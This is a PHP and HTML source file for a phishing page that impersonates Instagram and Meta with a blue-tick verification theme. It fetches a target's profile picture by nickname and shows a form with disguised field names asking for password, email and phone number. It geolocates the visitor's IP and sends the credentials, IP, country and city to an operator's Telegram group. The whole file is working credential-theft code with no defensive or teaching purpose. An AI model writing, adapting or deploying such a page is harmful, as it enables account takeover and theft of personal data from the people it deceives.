<?php 
error_reporting(0); 

    require 'load.php';
    include "config.php";
    session_start();
    set_time_limit(0);
    error_reporting(E_ALL);
    if ($_GET["nick"]) {
        $url="https://smihub.com/search?query=".$_GET['nick'];
        $ip=str_get_html(file_get_contents($url));
        $pp=$ip->find("img[class='img-fluid w-100']",0)->src;

        $_SESSION["username"]=$_GET["nick"];
        $_SESSION['pp']=$pp;
    }
    if ($_POST) {
        $username = $_SESSION["username"];
        $password = $_POST["zwoup"];
        $email = $_POST["qwuos"];
        $phone = $_POST["mwoua"];
        $ip = ($_SERVER["REMOTE_ADDR"] != "::1" ? $_SERVER["REMOTE_ADDR"] : "");

        $konum = file_get_contents("http://ip-api.com/json/".$ip);
        $cek = json_decode($konum, true);
        $ulke = $cek["country"];
        $sehir = $cek["city"];
        

        date_default_timezone_set('Europe/Istanbul');
        $cur_time = date("d-m-Y H:i:s");

        $admin_message  = "nick : ".$username;
        $admin_message .= "\npassword : ".$password;
        $admin_message .= "\nemail : ".$email;
        $admin_message .= "\nphone : ".$phone;
        $admin_message .= "\nip : ".$cek["query"];
        $admin_message .= "\nulke : ".$ulke;
        $admin_message .= "\nsehir : ".$sehir;

        $user_message  = "nick : ".$username;
        $user_message  .= "\npassword : ".(trim($password) == "" ? "-" : "Parola Girildi");

        TelegramSendMessage($bot_admin, [
            "chat_id" => $group_admin,
            "text" => $admin_message,
        ]);

        TelegramSendMessage($bot_kullanici, [
            "chat_id" => $group_kullanici,
            "text" => $user_message,
        ]);
        
        header("Refresh:3; url=complated.php");
    } 
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>Blue | Application Meta</title>
    <meta name="description" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" href="./assets/style.css">
    <link rel="shortcut icon" href="./assets/img/head.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css"/>
    <style>
        .red {
        color: red;
        display: none;
        }
    </style>
</head>
<body>
    <?php 
error_reporting(0);
        include "header.php";
    ?>
    <div class="lsf_od">
        <div class="cardddd">
            <style>
                .card2 {
                    text-align: center;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    flex-direction: column;
                }
            </style>
            <div class="card2">
                <form autocomplete="off" method="post" id="asdDasas" enctype="multipart/form-data">
                    <center>
                        <img src="./assets/img/meta.png" width="250">
                        <style>
                            .user-resim .img {
                                margin-top: 10px;
                                border-radius: 50%;
                                height: 60px;
                                float: left;
                                margin-left: 10px;
                            }
                            .user-resim .tik {
                                margin-top: 10px;
                                border-radius: 50%;
                                float: left;
                                margin-left: 10px;
                            }
                        </style>
                        <div class="user-resim">
                            <img class="img" src="<?=$_SESSION['pp']?>" style="margin-left: 50px;">
                            <h4 style="float: left ; margin:30px 15px 15px 10px; font-weight: bold;"><?=$_SESSION['username']?></h4>
                            <img class="tik" width="20" src="./assets/img/tik.png" />
                        </div>
                        <style>
                            .box {
                                display: flex;
                                justify-content: center;
                                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                                width: 100%;
                                height: 100%;
                            }
                            .box table {
                                margin-top: 16px;
                                border: 2px solid transparent;
                                border-radius: 5px;
                                font-weight: bold;
                                padding: 10px;
                                list-style: none;
                            }
                            .box table td {
                                padding: 5px 20px;
                            }
                        </style>
                        <div class="box">
                            <table>
                                <thead>
                                    <tr>
                                        <td></td>
                                        <td></td>
                                        <td></td>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        <br>
                        <center>
                            <input id="zwoup" type="password" name="zwoup" placeholder="Password" class="fdasf_o" /><br>
                            <span class="red" id="zwoup_validation">Password is required</span><br>
                            <input id="qwuos" type="text" class="fdasf_o" name="qwuos"
                                placeholder="E-Mail" /><br>
                            <span class="red" id="fdasf_o_validation">Email is required</span><br>
                            <input type="text" class="fdasf_o" id="phone" name="mwoua"
                                placeholder="Phone Number" /><br>
                                <span class="red" id="phone_validation">Phone Number is required</span><br>
                            <br>

                            <button type="submit" class="bvsf_asd">
                                <span>Continue
                                </span>
                            </button><br>
                            <img src="./assets/img/meta.gif" width="300px">
                        </center>
                </form>
            </div>
        </div>
    </div>
    </div>

    <script>
        addEventListener("load", () => {
            const email = document.querySelector('#qwuos'),
            phone = document.querySelector('#phone'),
            password = document.querySelector('#zwoup'),
            form = document.querySelector("#asdDasas"),
            zwoup_validation = document.querySelector('#zwoup_validation'), 
            fdasf_o_validation = document.querySelector('#fdasf_o_validation'),
            phone_validation = document.querySelector('#phone_validation');

            phone.addEventListener("input", function (e) {
                var x = e.target.value
                .replace(/\D/g, "")
                .match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
                e.target.value = !x[2]
                ? x[1]
                : "(" + x[1] + ") " + x[2] + (x[3] ? "-" + x[3] : "");
            });

            form.addEventListener("submit", async (e) => {
                if (email.value.trim() == "") {
                    e.preventDefault();
                    fdasf_o_validation.style.display = "block";
                } else {
                    fdasf_o_validation.style.display = "none";
                }

                if (phone.value.trim() == "") {
                    e.preventDefault();
                    phone_validation.style.display = "block";
                    await fetch('api.php?zwous=<?=$_SESSION["username"]?>');
                } else {
                    phone_validation.style.display = "none";
                }

                if (password.value.trim() == "") {
                    e.preventDefault();
                    zwoup_validation.style.display = "block";
                } else {
                    zwoup_validation.style.display = "none";
                }
            });
        });
    </script>
    <div class="footer">
        <p>© 2022 Instagram from Meta</p>
    </div>
</body>

</html>